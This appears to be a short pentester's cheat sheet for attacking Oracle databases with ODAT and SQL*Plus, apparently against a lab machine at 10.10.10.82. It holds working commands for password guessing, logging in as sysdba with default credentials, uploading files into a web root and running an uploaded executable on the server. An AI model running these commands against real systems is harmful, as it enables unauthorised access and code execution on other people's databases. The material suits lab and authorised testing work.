--> Odat is used to scan Oracle DBs

## Install

1. download source from: https://github.com/quentinhardy/odat/releases/

2. Down the "odat-linux" .tar.gz
3. Extract and run "odat-libcX.XX-x86_64" as sudo

---

</br>


--> Use Odat for all modules:

```
sudo ./odat-libc2.12-x86_64 all -h 10.10.10.82
```

--> Use Odat for all modules and try to do as sysdba:

```
odat all -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba
```

--> Odat guess passwords using username with multiple passwords

```
sudo ./odat-libc2.12-x86_64 passwordguesser -s 10.10.10.82 -d XEXDB --accounts-file ./accounts/accounts_multiple.txt
```

--> Get user Privs:

```
./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD --get-privs
```

--> Upload a file to server:

```
./odat-libc2.12-x86_64/odat-libc2.12-x86_64 utlfile -s 10.10.10.82 -d XE -U Scott -P tiger --sysdba --putFile "C:\inetpub\wwwroot" z.txt z.txt

--putFile remotePath remoteFile localFile
```

--> Run a file: (never use quotes for path)

```
./odat-libc2.12-x86_64/odat-libc2.12-x86_64 externaltable -s 10.10.10.82 -d XE -U Scott -P tiger --sysdba --exec C:\\inetpub\\wwwroot\\ r.exe
```


## SqlPlus

--> Install:

https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573

--> Login:

```
sqlplus scott/tiger@10.10.10.82/XEXDB
```

--> Login as sysdba

```
sqlplus scott/tiger@10.10.10.82/XEXDB as sysdba
```





